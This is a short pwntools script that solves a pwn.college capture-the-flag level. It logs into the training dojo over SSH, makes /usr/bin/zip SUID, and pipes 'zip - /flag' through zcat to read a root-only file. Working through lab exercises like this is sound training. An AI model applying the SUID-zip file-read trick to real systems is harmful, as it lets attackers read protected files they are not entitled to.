from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level19 to make /usr/bin/zip SUID
s.process("/challenge/babysuid_level19")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/zip /flag
# ? zip - to output to stdout
# ? pipe to zcat command to decompress and you get the flag
sh.sendline(b"zip - /flag 2>/dev/null | zcat")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
